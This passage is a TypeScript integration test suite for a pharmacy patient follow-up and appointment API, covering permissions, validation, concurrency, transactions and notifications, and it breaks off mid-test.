/**
 * Integration tests for Patient Engagement & Follow-up Management
 * Tests all API endpoints with various scenarios including authentication, authorization,
 * data validation, error responses, concurrent operations, and database transactions
 * Requirements: All requirements from Patient Engagement & Follow-up Management spec
 */

import mongoose from 'mongoose';
import { MongoMemoryServer } from 'mongodb-memory-server';
import request from 'supertest';
import app from '../../app';
import User from '../../models/User';
import Patient from '../../models/Patient';
import FollowUpTask from '../../models/FollowUpTask';
import Appointment from '../../models/Appointment';
import ClinicalIntervention from '../../models/ClinicalIntervention';
import MedicationTherapyReview from '../../models/MedicationTherapyReview';
import MTRFollowUp from '../../models/MTRFollowUp';
import DiagnosticCase from '../../models/DiagnosticCase';
import Notification from '../../models/Notification';
import { generateTestToken, createTestUserData, createTestPatientData } from '../utils/testHelpers';

describe('Patient Engagement & Follow-up Management Integration Tests', () => {
  let mongoServer: MongoMemoryServer;
  let workplaceId: mongoose.Types.ObjectId;
  let patientId: mongoose.Types.ObjectId;
  let pharmacistId: mongoose.Types.ObjectId;
  let technicianId: mongoose.Types.ObjectId;
  let pharmacistToken: string;
  let technicianToken: string;
  let invalidToken: string;

  beforeAll(async () => {
    mongoServer = await MongoMemoryServer.create();
    const mongoUri = mongoServer.getUri();
    await mongoose.connect(mongoUri);
  });

  afterAll(async () => {
    await mongoose.disconnect();
    await mongoServer.stop();
  });

  beforeEach(async () => {
    // Clear all collections
    await Promise.all([
      User.deleteMany({}),
      Patient.deleteMany({}),
      FollowUpTask.deleteMany({}),
      Appointment.deleteMany({}),
      ClinicalIntervention.deleteMany({}),
      MedicationTherapyReview.deleteMany({}),
      MTRFollowUp.deleteMany({}),
      DiagnosticCase.deleteMany({}),
      Notification.deleteMany({}),
    ]);

    workplaceId = new mongoose.Types.ObjectId();

    // Create test pharmacist
    const pharmacist = new User({
      ...createTestUserData({
        email: 'pharmacist@test.com',
        role: 'pharmacist',
        workplaceRole: 'Pharmacist',
      }),
      workplaceId,
      _id: new mongoose.Types.ObjectId(),
    });
    await pharmacist.save();
    pharmacistId = pharmacist._id;
    pharmacistToken = generateTestToken(pharmacist);

    // Create test technician
    const technician = new User({
      ...createTestUserData({
        email: 'technician@test.com',
        role: 'pharmacy_technician',
        workplaceRole: 'Technician',
      }),
      workplaceId,
      _id: new mongoose.Types.ObjectId(),
    });
    await technician.save();
    technicianId = technician._id;
    technicianToken = generateTestToken(technician);

    // Create test patient
    const patient = new Patient({
      ...createTestPatientData(workplaceId.toString(), {
        email: 'patient@test.com',
        mrn: 'TEST001',
      }),
      _id: new mongoose.Types.ObjectId(),
      createdBy: pharmacistId,
    });
    await patient.save();
    patientId = patient._id;

    // Create invalid token
    invalidToken = 'invalid.jwt.token';
  });

  describe('Follow-up Task Management', () => {
    describe('POST /api/follow-ups - Create Follow-up Task', () => {
      it('should create follow-up task with valid data', async () => {
        const followUpData = {
          patientId: patientId.toString(),
          title: 'Medication Adherence Check',
          description: 'Follow up on patient medication adherence',
          type: 'medication_adherence',
          priority: 'medium',
          dueDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
          assignedTo: pharmacistId.toString(),
        };

        const response = await request(app)
          .post('/api/follow-ups')
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(followUpData);

        expect(response.status).toBe(201);
        expect(response.body.success).toBe(true);
        expect(response.body.data.title).toBe(followUpData.title);
        expect(response.body.data.status).toBe('pending');
        expect(response.body.data.createdBy.toString()).toBe(pharmacistId.toString());
      });

      it('should validate required fields', async () => {
        const invalidData = {
          title: 'Test Follow-up',
          // Missing required fields
        };

        const response = await request(app)
          .post('/api/follow-ups')
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(invalidData);

        expect(response.status).toBe(400);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('validation');
      });

      it('should reject unauthorized access', async () => {
        const followUpData = {
          patientId: patientId.toString(),
          title: 'Test Follow-up',
          type: 'general',
          priority: 'low',
          dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        };

        const response = await request(app)
          .post('/api/follow-ups')
          .set('Authorization', `Bearer ${invalidToken}`)
          .send(followUpData);

        expect(response.status).toBe(401);
      });

      it('should enforce role-based permissions', async () => {
        const followUpData = {
          patientId: patientId.toString(),
          title: 'Restricted Follow-up',
          type: 'clinical_review',
          priority: 'high',
          dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        };

        // Technician should not be able to create clinical review follow-ups
        const response = await request(app)
          .post('/api/follow-ups')
          .set('Authorization', `Bearer ${technicianToken}`)
          .send(followUpData);

        expect(response.status).toBe(403);
      });
    });

    describe('GET /api/follow-ups - List Follow-up Tasks', () => {
      beforeEach(async () => {
        // Create test follow-up tasks
        const followUps = [
          {
            workplaceId,
            patientId,
            title: 'Medication Review',
            type: 'medication_review',
            priority: 'high',
            status: 'pending',
            dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
            assignedTo: pharmacistId,
            createdBy: pharmacistId,
          },
          {
            workplaceId,
            patientId,
            title: 'Adherence Check',
            type: 'medication_adherence',
            priority: 'medium',
            status: 'in_progress',
            dueDate: new Date(Date.now() + 48 * 60 * 60 * 1000),
            assignedTo: pharmacistId,
            createdBy: pharmacistId,
          },
        ];

        await FollowUpTask.insertMany(followUps);
      });

      it('should list follow-up tasks with pagination', async () => {
        const response = await request(app)
          .get('/api/follow-ups?page=1&limit=10')
          .set('Authorization', `Bearer ${pharmacistToken}`);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
        expect(response.body.data.followUps).toHaveLength(2);
        expect(response.body.data.pagination).toBeDefined();
      });

      it('should filter by status', async () => {
        const response = await request(app)
          .get('/api/follow-ups?status=pending')
          .set('Authorization', `Bearer ${pharmacistToken}`);

        expect(response.status).toBe(200);
        expect(response.body.data.followUps).toHaveLength(1);
        expect(response.body.data.followUps[0].status).toBe('pending');
      });

      it('should filter by priority', async () => {
        const response = await request(app)
          .get('/api/follow-ups?priority=high')
          .set('Authorization', `Bearer ${pharmacistToken}`);

        expect(response.status).toBe(200);
        expect(response.body.data.followUps).toHaveLength(1);
        expect(response.body.data.followUps[0].priority).toBe('high');
      });

      it('should filter by patient', async () => {
        const response = await request(app)
          .get(`/api/follow-ups/patient/${patientId}`)
          .set('Authorization', `Bearer ${pharmacistToken}`);

        expect(response.status).toBe(200);
        expect(response.body.data.followUps).toHaveLength(2);
      });
    });

    describe('PUT /api/follow-ups/:id - Update Follow-up Task', () => {
      let followUpId: mongoose.Types.ObjectId;

      beforeEach(async () => {
        const followUp = new FollowUpTask({
          workplaceId,
          patientId,
          title: 'Test Follow-up',
          type: 'general',
          priority: 'medium',
          status: 'pending',
          dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
          assignedTo: pharmacistId,
          createdBy: pharmacistId,
        });
        await followUp.save();
        followUpId = followUp._id;
      });

      it('should update follow-up task successfully', async () => {
        const updateData = {
          title: 'Updated Follow-up',
          priority: 'high',
          notes: 'Updated with new information',
        };

        const response = await request(app)
          .put(`/api/follow-ups/${followUpId}`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(updateData);

        expect(response.status).toBe(200);
        expect(response.body.data.title).toBe(updateData.title);
        expect(response.body.data.priority).toBe(updateData.priority);
      });

      it('should validate update data', async () => {
        const invalidData = {
          priority: 'invalid_priority',
        };

        const response = await request(app)
          .put(`/api/follow-ups/${followUpId}`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(invalidData);

        expect(response.status).toBe(400);
      });

      it('should enforce ownership permissions', async () => {
        // Create another user's follow-up
        const otherUser = new User({
          ...createTestUserData({
            email: 'other@test.com',
          }),
          workplaceId: new mongoose.Types.ObjectId(), // Different workplace
        });
        await otherUser.save();

        const otherToken = generateTestToken(otherUser);

        const response = await request(app)
          .put(`/api/follow-ups/${followUpId}`)
          .set('Authorization', `Bearer ${otherToken}`)
          .send({ title: 'Unauthorized update' });

        expect(response.status).toBe(403);
      });
    });

    describe('POST /api/follow-ups/:id/complete - Complete Follow-up Task', () => {
      let followUpId: mongoose.Types.ObjectId;

      beforeEach(async () => {
        const followUp = new FollowUpTask({
          workplaceId,
          patientId,
          title: 'Test Follow-up',
          type: 'medication_adherence',
          priority: 'medium',
          status: 'in_progress',
          dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
          assignedTo: pharmacistId,
          createdBy: pharmacistId,
        });
        await followUp.save();
        followUpId = followUp._id;
      });

      it('should complete follow-up task with outcome', async () => {
        const completionData = {
          outcome: 'Patient adherence improved',
          notes: 'Discussed medication schedule with patient',
          nextAction: 'Schedule follow-up in 2 weeks',
        };

        const response = await request(app)
          .post(`/api/follow-ups/${followUpId}/complete`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(completionData);

        expect(response.status).toBe(200);
        expect(response.body.data.status).toBe('completed');
        expect(response.body.data.completedAt).toBeDefined();
        expect(response.body.data.outcome).toBe(completionData.outcome);
      });

      it('should validate completion data', async () => {
        const invalidData = {
          // Missing required outcome
          notes: 'Some notes',
        };

        const response = await request(app)
          .post(`/api/follow-ups/${followUpId}/complete`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(invalidData);

        expect(response.status).toBe(400);
      });
    });
  });

  describe('Engagement Integration', () => {
    describe('POST /api/engagement-integration/mtr/:mtrSessionId/appointment', () => {
      let mtrSessionId: mongoose.Types.ObjectId;

      beforeEach(async () => {
        const mtrSession = new MedicationTherapyReview({
          workplaceId,
          patientId,
          pharmacistId,
          reviewNumber: 'MTR-001',
          reviewType: 'comprehensive',
          status: 'completed',
          startedAt: new Date(Date.now() - 60 * 60 * 1000),
          completedAt: new Date(),
          medications: [],
          createdBy: pharmacistId,
        });
        await mtrSession.save();
        mtrSessionId = mtrSession._id;
      });

      it('should create appointment from MTR session', async () => {
        const appointmentData = {
          patientId: patientId.toString(),
          assignedTo: pharmacistId.toString(),
          scheduledDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
          scheduledTime: '10:00',
          duration: 30,
          description: 'Follow-up appointment from MTR',
        };

        const response = await request(app)
          .post(`/api/engagement-integration/mtr/${mtrSessionId}/appointment`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(appointmentData);

        expect(response.status).toBe(201);
        expect(response.body.data.appointment).toBeDefined();
        expect(response.body.data.appointment.type).toBe('mtr_followup');
        expect(response.body.data.linkedMTRSession).toBe(mtrSessionId.toString());
      });

      it('should validate appointment data', async () => {
        const invalidData = {
          patientId: patientId.toString(),
          // Missing required fields
        };

        const response = await request(app)
          .post(`/api/engagement-integration/mtr/${mtrSessionId}/appointment`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(invalidData);

        expect(response.status).toBe(400);
      });
    });

    describe('POST /api/engagement-integration/intervention/:interventionId/create-followup', () => {
      let interventionId: mongoose.Types.ObjectId;

      beforeEach(async () => {
        const intervention = new ClinicalIntervention({
          workplaceId,
          patientId,
          pharmacistId,
          type: 'drug_therapy_problem',
          title: 'Drug Interaction Issue',
          description: 'Potential interaction between medications',
          priority: 'high',
          status: 'resolved',
          createdBy: pharmacistId,
        });
        await intervention.save();
        interventionId = intervention._id;
      });

      it('should create follow-up from clinical intervention', async () => {
        const followUpData = {
          patientId: patientId.toString(),
          assignedTo: pharmacistId.toString(),
        };

        const response = await request(app)
          .post(`/api/engagement-integration/intervention/${interventionId}/create-followup`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(followUpData);

        expect(response.status).toBe(201);
        expect(response.body.data.followUpTask).toBeDefined();
        expect(response.body.data.followUpTask.type).toBe('intervention_followup');
        expect(response.body.data.linkedIntervention).toBe(interventionId.toString());
      });
    });
  });

  describe('Concurrent Operations and Race Conditions', () => {
    let followUpId: mongoose.Types.ObjectId;

    beforeEach(async () => {
      const followUp = new FollowUpTask({
        workplaceId,
        patientId,
        title: 'Concurrent Test Follow-up',
        type: 'general',
        priority: 'medium',
        status: 'pending',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      });
      await followUp.save();
      followUpId = followUp._id;
    });

    it('should handle concurrent updates with optimistic locking', async () => {
      // Simulate concurrent updates
      const updatePromises = [
        request(app)
          .put(`/api/follow-ups/${followUpId}`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send({ priority: 'high' }),
        request(app)
          .put(`/api/follow-ups/${followUpId}`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send({ notes: 'Updated notes' }),
      ];

      const results = await Promise.allSettled(updatePromises);
      
      // At least one should succeed
      const successfulUpdates = results.filter(result => 
        result.status === 'fulfilled' && result.value.status === 200
      );
      expect(successfulUpdates.length).toBeGreaterThan(0);
    });

    it('should prevent race conditions in status changes', async () => {
      // Try to complete and update simultaneously
      const operations = [
        request(app)
          .post(`/api/follow-ups/${followUpId}/complete`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send({ outcome: 'Completed successfully' }),
        request(app)
          .put(`/api/follow-ups/${followUpId}`)
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send({ status: 'in_progress' }),
      ];

      const results = await Promise.allSettled(operations);
      
      // Verify final state is consistent
      const finalState = await FollowUpTask.findById(followUpId);
      expect(['completed', 'in_progress']).toContain(finalState!.status);
    });
  });

  describe('Database Transactions and Rollbacks', () => {
    it('should rollback transaction on appointment creation failure', async () => {
      const mtrSession = new MedicationTherapyReview({
        workplaceId,
        patientId,
        pharmacistId,
        reviewNumber: 'MTR-ROLLBACK',
        reviewType: 'comprehensive',
        status: 'completed',
        startedAt: new Date(Date.now() - 60 * 60 * 1000),
        completedAt: new Date(),
        medications: [],
        createdBy: pharmacistId,
      });
      await mtrSession.save();

      // Create appointment with invalid data to trigger rollback
      const invalidAppointmentData = {
        patientId: 'invalid-patient-id', // Invalid ObjectId
        assignedTo: pharmacistId.toString(),
        scheduledDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
        scheduledTime: '10:00',
      };

      const response = await request(app)
        .post(`/api/engagement-integration/mtr/${mtrSession._id}/appointment`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(invalidAppointmentData);

      expect(response.status).toBe(400);

      // Verify no orphaned records were created
      const appointments = await Appointment.find({ 
        'relatedRecords.mtrSessionId': mtrSession._id 
      });
      expect(appointments).toHaveLength(0);
    });

    it('should maintain data consistency during follow-up completion', async () => {
      const followUp = new FollowUpTask({
        workplaceId,
        patientId,
        title: 'Transaction Test',
        type: 'medication_adherence',
        priority: 'medium',
        status: 'in_progress',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      });
      await followUp.save();

      const completionData = {
        outcome: 'Patient adherence improved',
        notes: 'Comprehensive follow-up completed',
        createNextFollowUp: true,
        nextFollowUpDate: new Date(Date.now() + 14 * 24 * 60 * 60 * 1000).toISOString(),
      };

      const response = await request(app)
        .post(`/api/follow-ups/${followUp._id}/complete`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(completionData);

      expect(response.status).toBe(200);

      // Verify both completion and next follow-up creation
      const completedFollowUp = await FollowUpTask.findById(followUp._id);
      expect(completedFollowUp!.status).toBe('completed');

      if (completionData.createNextFollowUp) {
        const nextFollowUps = await FollowUpTask.find({
          patientId,
          status: 'pending',
          createdAt: { $gt: completedFollowUp!.completedAt },
        });
        expect(nextFollowUps.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should handle non-existent resource gracefully', async () => {
      const nonExistentId = new mongoose.Types.ObjectId();

      const response = await request(app)
        .get(`/api/follow-ups/${nonExistentId}`)
        .set('Authorization', `Bearer ${pharmacistToken}`);

      expect(response.status).toBe(404);
      expect(response.body.message).toContain('not found');
    });

    it('should handle malformed ObjectId', async () => {
      const response = await request(app)
        .get('/api/follow-ups/invalid-id')
        .set('Authorization', `Bearer ${pharmacistToken}`);

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('Invalid');
    });

    it('should handle database connection errors gracefully', async () => {
      // Temporarily close database connection
      await mongoose.disconnect();

      const response = await request(app)
        .get('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`);

      expect(response.status).toBe(500);

      // Reconnect for cleanup
      await mongoose.connect(mongoServer.getUri());
    });

    it('should validate date ranges', async () => {
      const invalidFollowUpData = {
        patientId: patientId.toString(),
        title: 'Invalid Date Follow-up',
        type: 'general',
        priority: 'medium',
        dueDate: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(), // Past date
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(invalidFollowUpData);

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('future');
    });
  });

  describe('Performance and Load Testing', () => {
    it('should handle bulk follow-up creation efficiently', async () => {
      const bulkData = Array.from({ length: 50 }, (_, index) => ({
        patientId: patientId.toString(),
        title: `Bulk Follow-up ${index + 1}`,
        type: 'general',
        priority: 'low',
        dueDate: new Date(Date.now() + (index + 1) * 24 * 60 * 60 * 1000).toISOString(),
      }));

      const startTime = Date.now();
      
      const promises = bulkData.map(data =>
        request(app)
          .post('/api/follow-ups')
          .set('Authorization', `Bearer ${pharmacistToken}`)
          .send(data)
      );

      const results = await Promise.all(promises);
      const endTime = Date.now();

      // All requests should succeed
      results.forEach(result => {
        expect(result.status).toBe(201);
      });

      // Should complete within reasonable time (adjust threshold as needed)
      expect(endTime - startTime).toBeLessThan(10000); // 10 seconds
    });

    it('should handle concurrent read operations efficiently', async () => {
      // Create some test data
      const followUps = Array.from({ length: 20 }, (_, index) => ({
        workplaceId,
        patientId,
        title: `Concurrent Test ${index + 1}`,
        type: 'general',
        priority: 'medium',
        status: 'pending',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      }));

      await FollowUpTask.insertMany(followUps);

      // Simulate concurrent read requests
      const readPromises = Array.from({ length: 10 }, () =>
        request(app)
          .get('/api/follow-ups?limit=20')
          .set('Authorization', `Bearer ${pharmacistToken}`)
      );

      const startTime = Date.now();
      const results = await Promise.all(readPromises);
      const endTime = Date.now();

      // All requests should succeed
      results.forEach(result => {
        expect(result.status).toBe(200);
        expect(result.body.data.followUps).toHaveLength(20);
      });

      // Should complete within reasonable time
      expect(endTime - startTime).toBeLessThan(5000); // 5 seconds
    });
  });

  describe('Notification Integration', () => {
    it('should send notifications on follow-up creation', async () => {
      const followUpData = {
        patientId: patientId.toString(),
        title: 'Urgent Medication Review',
        description: 'Patient requires immediate medication review',
        type: 'medication_review',
        priority: 'high',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        assignedTo: pharmacistId.toString(),
        notifyAssignee: true,
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(followUpData);

      expect(response.status).toBe(201);

      // Verify notification was created
      const notifications = await Notification.find({
        userId: pharmacistId,
        type: 'followup_assigned',
      });

      expect(notifications.length).toBeGreaterThan(0);
      expect(notifications[0].title).toContain('Follow-up Task Assigned');
    });

    it('should send overdue notifications', async () => {
      // Create overdue follow-up
      const overdueFollowUp = new FollowUpTask({
        workplaceId,
        patientId,
        title: 'Overdue Follow-up',
        type: 'general',
        priority: 'medium',
        status: 'pending',
        dueDate: new Date(Date.now() - 24 * 60 * 60 * 1000), // Yesterday
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      });
      await overdueFollowUp.save();

      const response = await request(app)
        .get('/api/follow-ups/overdue')
        .set('Authorization', `Bearer ${pharmacistToken}`);

      expect(response.status).toBe(200);
      expect(response.body.data.followUps).toHaveLength(1);
      expect(response.body.data.followUps[0].isOverdue).toBe(true);
    });
  });
});

describe('Patient Engagement & Follow-up Management - Advanced Tests', () => {
  let mongoServer: MongoMemoryServer;
  let workplaceId: mongoose.Types.ObjectId;
  let patientId: mongoose.Types.ObjectId;
  let pharmacistId: mongoose.Types.ObjectId;
  let technicianId: mongoose.Types.ObjectId;
  let pharmacistToken: string;
  let technicianToken: string;

  beforeAll(async () => {
    mongoServer = await MongoMemoryServer.create();
    const mongoUri = mongoServer.getUri();
    await mongoose.connect(mongoUri);
  });

  afterAll(async () => {
    await mongoose.disconnect();
    await mongoServer.stop();
  });

  beforeEach(async () => {
    // Clear all collections
    await Promise.all([
      User.deleteMany({}),
      Patient.deleteMany({}),
      FollowUpTask.deleteMany({}),
      Appointment.deleteMany({}),
      ClinicalIntervention.deleteMany({}),
      MedicationTherapyReview.deleteMany({}),
      MTRFollowUp.deleteMany({}),
      DiagnosticCase.deleteMany({}),
      Notification.deleteMany({}),
    ]);

    workplaceId = new mongoose.Types.ObjectId();

    // Create test pharmacist
    const pharmacist = new User({
      ...createTestUserData({
        email: 'pharmacist@test.com',
        role: 'pharmacist',
        workplaceRole: 'Pharmacist',
      }),
      workplaceId,
      _id: new mongoose.Types.ObjectId(),
    });
    await pharmacist.save();
    pharmacistId = pharmacist._id;
    pharmacistToken = generateTestToken(pharmacist);

    // Create test technician
    const technician = new User({
      ...createTestUserData({
        email: 'technician@test.com',
        role: 'pharmacy_technician',
        workplaceRole: 'Technician',
      }),
      workplaceId,
      _id: new mongoose.Types.ObjectId(),
    });
    await technician.save();
    technicianId = technician._id;
    technicianToken = generateTestToken(technician);

    // Create test patient
    const patient = new Patient({
      ...createTestPatientData(workplaceId.toString(), {
        email: 'patient@test.com',
        mrn: 'TEST001',
      }),
      _id: new mongoose.Types.ObjectId(),
      createdBy: pharmacistId,
    });
    await patient.save();
    patientId = patient._id;
  });

  describe('Advanced Authentication and Authorization', () => {
    it('should handle expired tokens', async () => {
      // Create an expired token (this would normally be handled by JWT library)
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NzQxYWY4ZjU4YzQyZjAwMTNkNzg5YzQiLCJleHAiOjE2MzI0MzI0MDB9.invalid';

      const response = await request(app)
        .get('/api/follow-ups')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
      expect(response.body.message).toContain('token');
    });

    it('should enforce workspace isolation', async () => {
      // Create user from different workplace
      const otherWorkplaceId = new mongoose.Types.ObjectId();
      const otherUser = new User({
        ...createTestUserData({
          email: 'other-workplace@test.com',
        }),
        workplaceId: otherWorkplaceId,
      });
      await otherUser.save();
      const otherToken = generateTestToken(otherUser);

      // Try to access follow-ups from different workplace
      const response = await request(app)
        .get('/api/follow-ups')
        .set('Authorization', `Bearer ${otherToken}`);

      expect(response.status).toBe(200);
      expect(response.body.data.followUps).toHaveLength(0); // Should not see other workplace's data
    });

    it('should validate API key authentication for external integrations', async () => {
      const response = await request(app)
        .get('/api/engagement-integration/mtr/123/appointment')
        .set('X-API-Key', 'invalid-api-key');

      expect(response.status).toBe(401);
    });

    it('should handle role hierarchy permissions', async () => {
      // Create supervisor role user
      const supervisor = new User({
        ...createTestUserData({
          email: 'supervisor@test.com',
          role: 'pharmacy_manager',
          workplaceRole: 'Manager',
        }),
        workplaceId,
      });
      await supervisor.save();
      const supervisorToken = generateTestToken(supervisor);

      // Supervisor should be able to access all follow-ups
      const response = await request(app)
        .get('/api/follow-ups')
        .set('Authorization', `Bearer ${supervisorToken}`);

      expect(response.status).toBe(200);
    });
  });

  describe('Complex Data Validation Scenarios', () => {
    it('should validate nested object structures', async () => {
      const complexFollowUpData = {
        patientId: patientId.toString(),
        title: 'Complex Follow-up',
        type: 'medication_review',
        priority: 'high',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        metadata: {
          source: 'mtr_session',
          sourceId: new mongoose.Types.ObjectId().toString(),
          customFields: {
            reviewType: 'comprehensive',
            medications: ['med1', 'med2'],
          },
        },
        reminders: [
          {
            type: 'email',
            scheduledFor: new Date(Date.now() + 12 * 60 * 60 * 1000).toISOString(),
          },
          {
            type: 'sms',
            scheduledFor: new Date(Date.now() + 6 * 60 * 60 * 1000).toISOString(),
          },
        ],
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(complexFollowUpData);

      expect(response.status).toBe(201);
      expect(response.body.data.metadata).toBeDefined();
      expect(response.body.data.reminders).toHaveLength(2);
    });

    it('should validate cross-field dependencies', async () => {
      const invalidData = {
        patientId: patientId.toString(),
        title: 'Dependent Field Test',
        type: 'appointment_followup',
        priority: 'high',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        // Missing required appointmentId for appointment_followup type
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(invalidData);

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('appointmentId');
    });

    it('should validate business rules', async () => {
      // Try to create follow-up for inactive patient
      await Patient.findByIdAndUpdate(patientId, { status: 'inactive' });

      const followUpData = {
        patientId: patientId.toString(),
        title: 'Follow-up for Inactive Patient',
        type: 'general',
        priority: 'medium',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(followUpData);

      expect(response.status).toBe(400);
      expect(response.body.message).toContain('inactive');
    });

    it('should validate file upload constraints', async () => {
      const followUp = new FollowUpTask({
        workplaceId,
        patientId,
        title: 'File Upload Test',
        type: 'general',
        priority: 'medium',
        status: 'pending',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000),
        assignedTo: pharmacistId,
        createdBy: pharmacistId,
      });
      await followUp.save();

      // Test file size limit
      const largeFileBuffer = Buffer.alloc(10 * 1024 * 1024); // 10MB

      const response = await request(app)
        .post(`/api/follow-ups/${followUp._id}/attachments`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .attach('file', largeFileBuffer, 'large-file.pdf');

      expect(response.status).toBe(413); // Payload too large
    });
  });

  describe('Advanced Error Response Testing', () => {
    it('should provide detailed validation errors', async () => {
      const invalidData = {
        patientId: 'invalid-id',
        title: '', // Empty title
        type: 'invalid-type',
        priority: 'invalid-priority',
        dueDate: 'invalid-date',
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(invalidData);

      expect(response.status).toBe(400);
      expect(response.body.errors).toBeDefined();
      expect(response.body.errors.length).toBeGreaterThan(1);
      expect(response.body.errors.some((error: any) => error.field === 'patientId')).toBe(true);
      expect(response.body.errors.some((error: any) => error.field === 'title')).toBe(true);
    });

    it('should handle database constraint violations', async () => {
      // Create follow-up with unique constraint
      const followUpData = {
        patientId: patientId.toString(),
        title: 'Unique Follow-up',
        type: 'general',
        priority: 'medium',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
        externalId: 'UNIQUE-001',
      };

      // First creation should succeed
      const response1 = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(followUpData);

      expect(response1.status).toBe(201);

      // Second creation with same externalId should fail
      const response2 = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send(followUpData);

      expect(response2.status).toBe(409); // Conflict
      expect(response2.body.message).toContain('duplicate');
    });

    it('should handle network timeout scenarios', async () => {
      // Mock slow database operation
      jest.setTimeout(30000);

      const followUpData = {
        patientId: patientId.toString(),
        title: 'Timeout Test Follow-up',
        type: 'general',
        priority: 'medium',
        dueDate: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
      };

      const response = await request(app)
        .post('/api/follow-ups')
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .timeout(1000) // 1 second timeout
        .send(followUpData);

      // Should handle timeout gracefully
      expect([408, 500]).toContain(response.status);
    });
  });

  describe('Integration Workflow Testing', () => {
    it('should handle complete MTR to appointment workflow', async () => {
      // Step 1: Create MTR session
      const mtrSession = new MedicationTherapyReview({
        workplaceId,
        patientId,
        pharmacistId,
        reviewNumber: 'MTR-WORKFLOW-001',
        reviewType: 'comprehensive',
        status: 'in_progress',
        startedAt: new Date(),
        medications: [
          {
            name: 'Metformin',
            dosage: '500mg',
            frequency: 'twice daily',
          },
        ],
        createdBy: pharmacistId,
      });
      await mtrSession.save();

      // Step 2: Complete MTR session
      const completeMTRResponse = await request(app)
        .put(`/api/mtr/${mtrSession._id}`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send({
          status: 'completed',
          completedAt: new Date().toISOString(),
          outcomes: ['medication_optimization'],
        });

      expect(completeMTRResponse.status).toBe(200);

      // Step 3: Create follow-up from MTR
      const followUpResponse = await request(app)
        .post(`/api/engagement-integration/mtr/${mtrSession._id}/schedule`)
        .set('Authorization', `Bearer ${pharmacistToken}`)
        .send({
          patientId: patientId.toString(),
          assignedTo: pharmacistId.toString(),
          scheduledDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
          scheduledTime: '14:00',
          duration: 30,
          description: 'Follow-up on medication optimization',
          objectives: ['Review medication adherence', 'Assess side effects'],
          priority: 'medium',
        });

      expect(followUpResponse.status).toBe(201);
      expect(followUpResponse.body.data.appointment).toBeDefined();
      expect(followUpResponse.body.data.followUpTask).toBeDefined();

      // Step 4: Verify linkage
      const linkedAppointment = await Appointment.findById(followUpResponse.body.data.appointment._id);
      expect(linkedAppointment!.relatedRecords.mtrSessionId!.toString()).toBe(mtrSession._id.toString());
    });

    it('should handle diagnostic to follow-up workflow', async () => {
      // Step 1: Create diagnostic case
      const diagnosticCase = new DiagnosticCase({
        workplaceId,
        patientId,
        pharmacistId,
